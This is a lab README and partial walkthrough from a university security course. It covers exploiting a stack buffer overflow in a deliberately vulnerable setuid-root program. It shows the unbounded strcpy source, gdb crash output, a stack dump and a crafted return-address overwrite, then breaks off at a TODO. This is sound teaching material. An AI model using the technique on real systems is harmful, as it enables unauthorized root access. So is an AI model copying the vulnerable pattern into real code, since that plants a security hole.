# UAF CSC x86_64 Buffer Overflow Lab
The purpose of this lab is to exercise exploiting the root setuid of a program via a buffer overflow.

## Setup
This lab will require a 64bit Linux virtual machine with cmake and gdb installed, and [ASLR](https://www.networkworld.com/article/3331199/what-does-aslr-do-for-linux.html) disabled. This can be done by adding the file `(/etc/sysctl.d/01-disable-aslr.conf)` containing the following to `sysctl`:
```txt
kernel.randomize_va_space = 0
```

No particular distribution is required, though this has only been tested on Ubuntu and Arch with Intel CPUs.

Once the VMs are setup make 2 accounts. 

### Account 1
This first account will be our target "Administrator" account with a long secure password (though do not one that you use), 
and sudo / root access.

If youd like to use this as a ctf-style lab you may also include a flag that will appear on the desktop when the user logs into the GUI, 
but for our purposes this will just serve the purpose of demonstrating that you have access to any account as root, 
and can even log into said accounts.

### Account 2
This second account will be a "Guest" account with no passwords, and no sudo / root access. 
This account shall have the main vulnerable [hash](main.c) binary installed with its setuid as root. 
It is highly recommended to also provide the inline shellcode string found in [shellcode.h](shellcode.h) in a hidden file.

## Writeup (Spoilers ahead!)

### Step 0: Information gathering

When looking for information that can be used to our advantage one if the first things to do will be to check out the hash program.
Running it without any arguments produces the following:
```txt
Usage: ./hash <string>
```
Ok, so it expects a string. Providing a text string `foo` changes the output to:
```txt
Hash: $6$/.VATz3thu0iHIDZ$9BsKgAl9DuiIQ51zXoFnVrOHU.0HbyHGuo1xcw9Szwja08fAqd8zBnGdWWrVT24D.n0Qd.LfV8BCI1aWvg8HV1
```
Neat! It hashes our string. Wonder if there's any limitations on the input?

Continuing to investigate the program if we run `ls -l hash` we learn the following:
```txt
-rwsr-xr-x 1 root root 23104 Nov  7 20:05 hash
```
Of note is the setuid bit, and the fact that it's owned by root.

If we run the `file` command on it we get the following:
```txt
hash: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=349b894fbc026b7b75dbe745f9ec698ca96daa6a, for GNU/Linux 4.4.0, with debug_info, not stripped
```

A few takeaways from this is that the program is a setuid 64-bit executable, that is **not stripped**.  
This means that when we pop it in a debugger with `gdb hash` we can view the programs source code!

### Step 1: Running (exploiting) with a debugger
In gdb we can view the source code with the `list` command which returns the following:
```c
(gdb) list
1	#include <stdio.h>
2	#include "hash.h"
3	
4	int main(int argc, char** argv) {
5	
6		if (argc != 2) {
7			printf("Usage: ./hash <string>\n");
8			return 1;
9		}
10	
(gdb)
11		char input[512];
12		strcpy(input, argv[1]);
13	
14		char* hash = crypt(input, makesalt('6'));
15		printf("Hash: %s\n", hash);
16	
17		return 0;
18	}
```
After the check to see if a string is provided what immediately jumps out is the size allotted for our input; 
It only allocates 512 bytes for our input, but never checks the length. 
If we *hypothetically* provided a string longer than 512 bytes we could possibly make the program execute arbitrary code!

### Step 2: Crafting an exploit

Luckily for us we dont have to actaully write a string that is 500+bytes long; we can get the terminal to do it for us.
If we execute provide `$(printf "\x41%.0s" {1..540})` as our string it'll translate to 540 "A"s (hex 41) - which results in the following:
```txt
(gdb) run $(printf "\x41%.0s" {1..540})
Starting program: hash $(printf "\x41%.0s" {1..540})
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Hash: (null)

Program received signal SIGSEGV, Segmentation fault.
0x00007f0041414141 in ?? ()
```
For our case ignore the threading information. Whats notable here is the address it segfaulted on - `0x00007f0041414141` looks like it was partially overwritten with our 41s.

This is our return address. 
If we increase the number of 41s we provide to 542 we could overwrite the entire thing, but it would be best if we could pickout an address on the stack to jump to.

We can take a look at our stack memory by entering the following:
```txt
(gdb) x /-140fx $rsp
0x7fff35ef0a40:	0x35ef0d78	0x00007fff	0x00000000	0x00000002
0x7fff35ef0a50:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0a60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0a70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0a80:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0a90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0aa0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0ab0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0ac0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0ad0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0ae0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0af0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b40:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b50:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b80:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0b90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0ba0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0bb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0bc0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0bd0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0be0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0bf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0c00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0c10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0c20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0c30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0c40:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fff35ef0c50:	0x41414141	0x41414141	0x00000000	0x00000000
0x7fff35ef0c60:	0x41414141	0x41414141	0x41414141	0x00007f00
```

Look at all those 41s. Lets pick out an address towards the top - memory shifts around slightly, so the larger the buffer the better.
Well use `0x7fff35ef0a60` for this example.

Going back to our string we have to input our address in backwards as intel is [little endian]().
So the resulting code should fill the stack with 41s and then point back into it:
```txt
(gdb) run $(printf "\x41%.0s" {1..536}; printf "\x60\x0a\xef\x35\xff\x7f")
```

// TODO